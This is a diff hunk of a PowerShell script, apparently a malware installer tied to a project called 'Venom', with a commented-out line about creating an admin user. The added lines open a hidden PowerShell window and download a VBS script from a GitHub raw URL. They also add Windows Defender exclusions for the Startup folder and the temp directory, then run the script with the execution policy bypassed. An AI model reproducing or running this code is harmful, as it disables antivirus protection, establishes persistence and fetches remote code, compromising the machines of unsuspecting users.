@@ -26,7 +26,9 @@ $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
 
+powershell powershell.exe -ep bypass ./RunHidden
 
 # create admin user
 #$NewLocalAdmin = ".Venom"
